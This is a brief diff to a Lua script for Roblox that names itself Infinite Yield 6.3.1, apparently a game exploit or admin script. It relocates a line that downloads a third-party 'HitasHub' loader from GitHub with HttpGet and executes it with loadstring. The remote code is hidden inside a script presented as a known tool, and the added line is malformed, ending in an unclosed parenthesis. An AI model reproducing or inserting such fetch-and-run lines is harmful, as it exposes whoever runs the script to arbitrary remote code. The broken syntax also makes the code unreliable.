@@ -15,8 +15,9 @@ if not game:IsLoaded() then
     notLoaded.Text = "Infinite Yield is waiting for the game to load"
     game.Loaded:Wait()
     notLoaded:Destroy()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/HistasWork/HitasHub/main/Loader.Lua"))(
 end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HistasWork/HitasHub/refs/heads/main/Loader.Lua"))()
+
 currentVersion = "6.3.1"
 
 ScaledHolder = Instance.new("Frame")
